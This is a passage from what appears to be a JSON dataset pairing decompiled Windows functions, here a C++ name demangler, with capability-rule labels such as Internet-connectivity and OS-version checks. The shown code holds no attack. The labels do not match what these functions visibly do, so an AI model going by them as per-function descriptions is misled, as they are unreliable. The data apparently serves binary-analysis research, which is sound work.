iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (pppuVar13 != pppuVar22);\n        }\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x42:\n        puVar15 = 0x525482;\n        uVar26 = 100;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x52548b) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x29;\n        in_EAX[0x104] = 0x29;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x43:\n        puVar15 = 0x52549d;\n        uVar26 = 0x67;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5254b9) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x44:\n        puVar15 = 0x5254bb;\n        uVar26 = 0x67;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5254d6) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x45:\n        puVar15 = 0x5254d8;\n        uVar26 = 0x7b;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5254df) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        puVar15 = 0x5254e0;\n        *(in_EAX + 0x120) = *(in_EAX + 0x120) + 1;\n        fcn.004306e0();\n        uVar26 = 0x29;\n        *(in_EAX + 0x120) = *(in_EAX + 0x120) + -1;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            puVar15 = puVar15 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5254e2) break;\n            uVar26 = *puVar15;\n            iVar20 = iVar4;\n        }\n        pppuVar22 = appuStack92;\n        sub.msvcrt.dll_sprintf(pppuVar22, 0x5252a7, param_1[3] + 1);\n        pppuVar13 = pppuVar22;\n        do {\n            pppuVar25 = pppuVar13;\n            uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n            uVar17 = uVar6 & 0x80808080;\n            pppuVar13 = pppuVar25 + 1;\n        } while (uVar17 == 0);\n        bVar27 = (uVar6 & 0x8080) == 0;\n        if (bVar27) {\n            uVar17 = uVar17 >> 0x10;\n        }\n        if (bVar27) {\n            pppuVar13 = pppuVar25 + 6;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n        if (puVar15 != NULL) {\n            pppuVar13 = pppuVar22 + puVar15;\n            iVar4 = iVar20;\n            do {\n                uVar26 = *pppuVar22;\n                if (iVar4 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar20 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar20 = iVar4 + 1;\n                }\n                pppuVar22 = pppuVar22 + 1;\n                *(in_EAX + 0x100) = iVar20;\n                in_EAX[iVar4] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar4 = iVar20;\n            } while (pppuVar13 != pppuVar22);\n        }\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7d;\n        in_EAX[0x104] = 0x7d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x47:\n        puVar15 = 0x5254e4;\n        uVar26 = 0x7b;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5254f1) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        pppuVar22 = appuStack92;\n        sub.msvcrt.dll_sprintf(pppuVar22, 0x5252a7, param_1[2] + 1);\n        pppuVar13 = pppuVar22;\n        do {\n            pppuVar25 = pppuVar13;\n            uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n            uVar17 = uVar6 & 0x80808080;\n            pppuVar13 = pppuVar25 + 1;\n        } while (uVar17 == 0);\n        bVar27 = (uVar6 & 0x8080) == 0;\n        if (bVar27) {\n            uVar17 = uVar17 >> 0x10;\n        }\n        if (bVar27) {\n            pppuVar13 = pppuVar25 + 6;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n        if (puVar15 != NULL) {\n            pppuVar13 = pppuVar22 + puVar15;\n            iVar4 = iVar20;\n            do {\n                uVar26 = *pppuVar22;\n                if (iVar4 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar20 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar20 = iVar4 + 1;\n                }\n                pppuVar22 = pppuVar22 + 1;\n                *(in_EAX + 0x100) = iVar20;\n                in_EAX[iVar4] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar4 = iVar20;\n            } while (pppuVar13 != pppuVar22);\n        }\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7d;\n        in_EAX[0x104] = 0x7d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x48:\n        puVar15 = 0x5253ea;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5253ff) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x49:\n        puVar15 = 0x525401;\n        uVar26 = 0x6e;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x52541a) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x4a:\n        piVar5 = fcn.0042dd40();\n        ppuStack124 = NULL;\n        if (piVar5 == NULL) {\n            fcn.004363c0();\n            fcn.0042d5b0();\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            do {\n                if ((*piVar5 != 0x2f) || (piVar5[2] == 0)) {\n                    if (ppuStack124 == NULL) {\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        goto code_r0x004308e1;\n                    }\n                    break;\n                }\n                piVar5 = piVar5[3];\n                ppuStack124 = ppuStack124 + 1;\n            } while (piVar5 != NULL);\n            do {\n                *(in_EAX + 0x124) = ppuStack128;\n                fcn.004306e0();\n                if (ppuStack128 < ppuStack124 + -1) {\n                    puVar15 = 0x52542f;\n                    uVar26 = 0x2c;\n                    iVar20 = *(in_EAX + 0x100);\n                    while( true ) {\n                        if (iVar20 == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            iVar4 = 1;\n                            iVar20 = 0;\n                        }\n                        else {\n                            iVar4 = iVar20 + 1;\n                        }\n                        puVar15 = puVar15 + 1;\n                        *(in_EAX + 0x100) = iVar4;\n                        in_EAX[iVar20] = uVar26;\n                        in_EAX[0x104] = uVar26;\n                        if (puVar15 == 0x525431) break;\n                        uVar26 = *puVar15;\n                        iVar20 = iVar4;\n                    }\n                }\n                ppuStack128 = ppuStack128 + 1;\n            } while (ppuStack128 < ppuStack124);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x4b:\n        pcVar16 = \"[abi:\";\n        fcn.004306e0();\n        cVar12 = '[';\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            pcVar16 = pcVar16 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = cVar12;\n            in_EAX[0x104] = cVar12;\n            if (pcVar16 == \"\") break;\n            cVar12 = *pcVar16;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x5d;\n        in_EAX[0x104] = 0x5d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x4d:\n        puVar15 = 0x5254f3;\n        fcn.004306e0();\n        uVar26 = 0x20;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5254fa) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x5d;\n        in_EAX[0x104] = 0x5d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n    }\ncode_r0x004308e1:\n    *(in_EAX + 300) = uStack104;\n    param_1[1] = uVar17;\n    *(in_EAX + 0x11c) = iVar20;\n    return;\ncode_r0x004340b8:\n    puVar7 = *ppuStack124;\n    if (puVar7 != 0x4c) {\n        if (puVar7 < 0x4d) {\n            if (0x4 < puVar7 + -7) goto code_r0x0043212d;\n        }\n        else if (1 < puVar7 - 0x4eU) goto code_r0x0043212d;\n    }\n    if (iStack120 == 4) goto code_r0x0043468b;\n    *(in_EAX + 0x114) = pppuVar22;\n    pppuVar13 = pppuVar22 + -4;\n    pppuVar25 = pppuVar22;\n    for (iVar20 = 4; iVar20 != 0; iVar20 = iVar20 + -1) {\n        *pppuVar25 = *pppuVar13;\n        pppuVar13 = pppuVar13 + 1;\n        pppuVar25 = pppuVar25 + 1;\n    }\n    pppuVar22[-2] = NULL;\n    *pppuVar22 = pppuVar22 + -4;\n    pppuVar22[-3] = ppuStack124;\n    pppuVar22[-1] = ppuVar21;\n    iStack120 = iStack120 + 1;\n    ppuStack124 = ppuStack124[2];\n    pppuVar22 = pppuVar22 + 4;\n    goto code_r0x004340b8;\ncode_r0x0043212d:\n    if (*ppuStack124 == 0x4) {\n        *(in_EAX + 0x110) = &ppuStack100;\n        auStack96 = ppuStack124;\n        ppuStack100 = ppuVar21;\n    }\n    fcn.004306e0();\n    if (*ppuStack124 == 0x4) {\n        *(in_EAX + 0x110) = ppuStack100;\n    }\n    pppuVar22 = appuStack92 + iStack120 * 4;\n    do {\n        if (pppuVar22[-2] == NULL) {\n            iVar20 = *(in_EAX + 0x100);\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar20 = 0;\n            }\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x20;\n            in_EAX[0x104] = 0x20;\n            fcn.00435070();\n        }\n        pppuVar22 = pppuVar22 + -4;\n    } while (appuStack92 != pppuVar22);\n    *(in_EAX + 0x114) = uVar2;\ncode_r0x004321ec:\n    uVar17 = param_1[1] - 1;\n    iVar20 = *(in_EAX + 0x11c) + -1;\n    goto code_r0x004308e1;\n}\n",
        "token_count": 32979
    },
    "00435cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435cc0(int32_t *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uchar uVar7;\n    uchar *puVar8;\n    uint32_t *puVar9;\n    uchar auStack53 [37];\n    \n    if (param_1 != NULL) {\n        iVar3 = *(in_EAX + 0x118);\n        while (iVar3 == 0) {\n            if (param_1[2] == 0) {\n                uVar4 = *param_1[1];\n                if (param_3 != 0) goto code_r0x00435cf8;\n                if (uVar4 != 0x4c) {\n                    if (uVar4 < 0x4d) {\n                        if (4 < uVar4 - 0x1c) goto code_r0x00435cf8;\n                    }\n                    else if (1 < uVar4 - 0x4e) {\ncode_r0x00435cf8:\n                        uVar1 = *(in_EAX + 0x110);\n                        param_1[2] = 1;\n                        *(in_EAX + 0x110) = param_1[3];\n                        if (uVar4 == 0x29) {\n                            fcn.00435990(*param_1);\n                            *(in_EAX + 0x110) = uVar1;\n                            return;\n                        }\n                        if (uVar4 == 0x2a) {\n                            fcn.00436080(*param_1);\n                            *(in_EAX + 0x110) = uVar1;\n                            return;\n                        }\n                        if (uVar4 == 2) {\n                            uVar2 = *(in_EAX + 0x114);\n                            *(in_EAX + 0x114) = 0;\n                            fcn.004306e0();\n                            *(in_EAX + 0x114) = uVar2;\n                            iVar3 = *(in_EAX + 0x100);\n                            if ((param_2 & 4) == 0) {\n                                puVar8 = 0x525296;\n                                uVar7 = 0x3a;\n                                while( true ) {\n                                    if (iVar3 == 0xff) {\n                                        *(in_EAX + 0xff) = 0;\n                                        (**(in_EAX + 0x108))();\n                                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                        iVar6 = 1;\n                                        iVar3 = 0;\n                                    }\n                                    else {\n                                        iVar6 = iVar3 + 1;\n                                    }\n                                    puVar8 = puVar8 + 1;\n                                    *(in_EAX + 0x100) = iVar6;\n                                    *(in_EAX + iVar3) = uVar7;\n                                    *(in_EAX + 0x104) = uVar7;\n                                    if (puVar8 == 0x525298) break;\n                                    uVar7 = *puVar8;\n                                    iVar3 = iVar6;\n                                }\n                            }\n                            else {\n                                iVar6 = iVar3 + 1;\n                                if (iVar3 == 0xff) {\n                                    *(in_EAX + 0xff) = 0;\n                                    (**(in_EAX + 0x108))();\n                                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                    iVar6 = 1;\n                                    iVar3 = 0;\n                                }\n                                *(in_EAX + 0x100) = iVar6;\n                                *(in_EAX + iVar3) = 0x2e;\n                                *(in_EAX + 0x104) = 0x2e;\n                            }\n                            puVar9 = *(param_1[1] + 0xc);\n                            uVar4 = *puVar9;\n                            if (uVar4 == 0x46) {\n                                puVar8 = 0x52529a;\n                                uVar7 = 0x7b;\n                                iVar3 = *(in_EAX + 0x100);\n                                while( true ) {\n                                    if (iVar3 == 0xff) {\n                                        *(in_EAX + 0xff) = 0;\n                                        (**(in_EAX + 0x108))();\n                                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                        iVar6 = 1;\n                                        iVar3 = 0;\n                                    }\n                                    else {\n                                        iVar6 = iVar3 + 1;\n                                    }\n                                    *(in_EAX + 0x100) = iVar6;\n                                    *(in_EAX + iVar3) = uVar7;\n                                    *(in_EAX + 0x104) = uVar7;\n                                    if (puVar8 == 0x5252a6) break;\n                                    uVar7 = *puVar8;\n                                    puVar8 = puVar8 + 1;\n                                    iVar3 = iVar6;\n                                }\n                                puVar8 = auStack53;\n                                sub.msvcrt.dll_sprintf(puVar8, 0x5252a7, puVar9[3] + 1);\n                                iVar6 = sub.msvcrt.dll_strlen(puVar8);\n                                iVar3 = *(in_EAX + 0x100);\n                                if (iVar6 != 0) {\n                                    puVar5 = puVar8 + iVar6;\n                                    iVar6 = iVar3;\n                                    do {\n                                        uVar7 = *puVar8;\n                                        if (iVar6 == 0xff) {\n                                            *(in_EAX + 0xff) = 0;\n                                            (**(in_EAX + 0x108))();\n                                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                            iVar3 = 1;\n                                            iVar6 = 0;\n                                        }\n                                        else {\n                                            iVar3 = iVar6 + 1;\n                                        }\n                                        puVar8 = puVar8 + 1;\n                                        *(in_EAX + 0x100) = iVar3;\n                                        *(in_EAX + iVar6) = uVar7;\n                                        *(in_EAX + 0x104) = uVar7;\n                                        iVar6 = iVar3;\n                                    } while (puVar5 != puVar8);\n                                }\n                                puVar8 = 0x5252aa;\n                                uVar7 = 0x7d;\n                                do {\n                                    if (iVar3 == 0xff) {\n                                        *(in_EAX + 0xff) = 0;\n                                        (**(in_EAX + 0x108))();\n                                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                        iVar6 = 1;\n                                        iVar3 = 0;\n                                    }\n                                    else {\n                                        iVar6 = iVar3 + 1;\n                                    }\n                                    *(in_EAX + 0x100) = iVar6;\n                                    puVar8 = puVar8 + 1;\n                                    *(in_EAX + iVar3) = uVar7;\n                                    *(in_EAX + 0x104) = uVar7;\n                                    if (puVar8 == 0x5252ad) goto code_r0x00435e75;\n                                    uVar7 = *puVar8;\n                                    iVar3 = iVar6;\n                                } while( true );\n                            }\n                            do {\n                                if (uVar4 != 0x4c) {\n                                    if (uVar4 < 0x4d) {\n                                        if (4 < uVar4 - 0x1c) {\ncode_r0x00435e10:\n                                            fcn.004306e0();\n                                            *(in_EAX + 0x110) = uVar1;\n                                            return;\n                                        }\n                                    }\n                                    else if (1 < uVar4 - 0x4e) goto code_r0x00435e10;\n                                }\ncode_r0x00435e75:\n                                puVar9 = puVar9[2];\n                                uVar4 = *puVar9;\n                            } while( true );\n                        }\n                        fcn.00435070();\n                        *(in_EAX + 0x110) = uVar1;\n                    }\n                }\n            }\n            param_1 = *param_1;\n            if (param_1 == NULL) {\n                return;\n            }\n            iVar3 = *(in_EAX + 0x118);\n        }\n    }\n    return;\n}\n",
        "token_count": 1880
    },
    "00436850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00436850(uint param_1, code *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    code *pcVar4;\n    uint8_t *in_EAX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t extraout_ECX;\n    uint *puVar9;\n    uint8_t *puVar10;\n    uint8_t uVar11;\n    uint8_t *puVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong uVar15;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    uint8_t *apuStack480 [4];\n    uchar auStack464 [16];\n    int32_t var_1bch;\n    int32_t var_1b8h_2;\n    uint32_t var_1b4h_2;\n    int32_t iStack436;\n    int32_t *var_1ach_2;\n    uint var_19ch_2;\n    uint8_t *puStack412;\n    uint32_t uStack408;\n    uint8_t *s;\n    uint32_t var_18ch_2;\n    int32_t var_188h_2;\n    int32_t var_184h_2;\n    uchar *puStack388;\n    uint uStack384;\n    int32_t iStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uchar auStack360 [256];\n    int32_t var_64h_2;\n    uchar uStack100;\n    code *var_5ch_2;\n    int32_t var_58h_2;\n    uint uStack88;\n    uint uStack84;\n    int32_t var_4ch_2;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *var_34h_2;\n    uint uStack52;\n    int32_t iStack48;\n    uchar *var_28h_2;\n    uint uStack40;\n    int32_t var_20h_2;\n    uint uStack32;\n    \n    uVar11 = *in_EAX;\n    var_1b4h_2 = var_1b4h_2 & 0xffffff00 | uVar11;\n    bVar13 = uVar11 < 0x5f;\n    bVar14 = uVar11 == 0x5f;\n    if (bVar14) {\n        bVar13 = in_EAX[1] < 0x5a;\n        bVar14 = in_EAX[1] == 0x5a;\n        uVar11 = 1;\n        if (bVar14) goto code_r0x004368c0;\n    }\n    iVar8 = 8;\n    puVar10 = in_EAX;\n    puVar12 = \"_GLOBAL_\";\n    do {\n        if (iVar8 == 0) break;\n        iVar8 = iVar8 + -1;\n        bVar13 = *puVar10 < *puVar12;\n        bVar14 = *puVar10 == *puVar12;\n        puVar10 = puVar10 + 1;\n        puVar12 = puVar12 + 1;\n    } while (bVar14);\n    uVar11 = 0;\n    if (((((!bVar13 && !bVar14) == bVar13) && ((uVar1 = in_EAX[8],  uVar1 == 0x2e || uVar1 == 0x5f || (uVar1 == 0x24))))\n        && ((uVar1 = in_EAX[9],  uVar1 == 0x44 || (uVar11 = 0,  uVar1 == 0x49)))) && (uVar11 = 0,  in_EAX[10] == 0x5f))\n    {\n        uVar11 = (uVar1 != 0x49) + 2;\n    }\ncode_r0x004368c0:\n    apuStack480[0] = 0x4368c8;\n    var_1ach_2 = param_2;\n    iStack380 = sub.msvcrt.dll_strlen();\n    puStack412 = in_EAX + iStack380;\n    uStack408 = 0x11;\n    var_1b8h_2 = iStack380 * 2;\n    var_188h_2 = 0;\n    uStack384 = 0;\n    uStack376 = 0;\n    uStack372 = 0;\n    uStack368 = 0;\n    uStack364 = 0;\n    apuStack480[0] = 0x436944;\n    s = in_EAX;\n    var_184h_2 = var_1b8h_2;\n    iVar8 = fcn.00437ed0();\n    iVar8 = -iVar8;\n    *(&stack0xfffffe20 + iVar8) = 0x436968;\n    uVar15 = fcn.00437ed0();\n    iVar2 = -uVar15;\n    var_18ch_2 = extraout_ECX;\n    puStack388 = &stack0xfffffe30 + iVar2 + iVar8;\n    if (uVar11 == 1) {\n        if (var_1b4h_2 != '_') {\n            return false;\n        }\n        if (in_EAX[1] != 0x5a) {\n            return false;\n        }\n        s = in_EAX + 2;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x436bd5;\n        uVar6 = fcn.0042ffd0();\n        if ((uStack408 & 1) == 0) {\n            uVar11 = *s;\n        }\n        else {\n            uVar11 = *s;\n            puVar10 = s;\n            while (s = puVar10,  uVar11 == 0x2e) {\n                uVar11 = puVar10[1];\n                if ((uVar11 + 0x9f < 0x1a) || (uVar11 == 0x5f)) {\n                    uVar11 = puVar10[2];\n                    s = puVar10 + 2;\n                    var_1b4h_2 = var_1b4h_2 & 0xffffff00 | uVar11;\n                    if ((uVar11 + 0x9f < 0x1a) || (uVar11 == 0x5f)) {\n                        var_1b4h_2 = uVar6;\n                        do {\n                            do {\n                                s = s + 1;\n                                uVar11 = *s;\n                            } while (uVar11 + 0x9f < 0x1a);\n                        } while (uVar11 == 0x5f);\n                    }\n                }\n                else {\n                    if (9 < uVar11 - 0x30) {\n                        uVar11 = *puVar10;\n                        break;\n                    }\n                    uVar11 = *puVar10;\n                }\n                while ((uVar11 == 0x2e && (s[1] - 0x30 < 10))) {\n                    puVar12 = s + 2;\n                    s = s + 2;\n                    uVar11 = *puVar12;\n                    while (uVar11 - 0x30 < 10) {\n                        s = s + 1;\n                        uVar11 = *s;\n                    }\n                }\n                if (var_188h_2 < var_184h_2) {\n                    puVar9 = var_188h_2 * 0x10 + var_18ch_2;\n                    puVar9[1] = 0;\n                    var_188h_2 = var_188h_2 + 1;\n                    if (s - puVar10 == 0) goto code_r0x00436d70;\n                    puVar9[1] = 0;\n                    *puVar9 = 0;\n                    puVar9[2] = puVar10;\n                    puVar9[3] = s - puVar10;\n                }\n                else {\ncode_r0x00436d70:\n                    puVar9 = NULL;\n                }\n                *(&stack0xfffffe24 + iVar2 + iVar8) = puVar9;\n                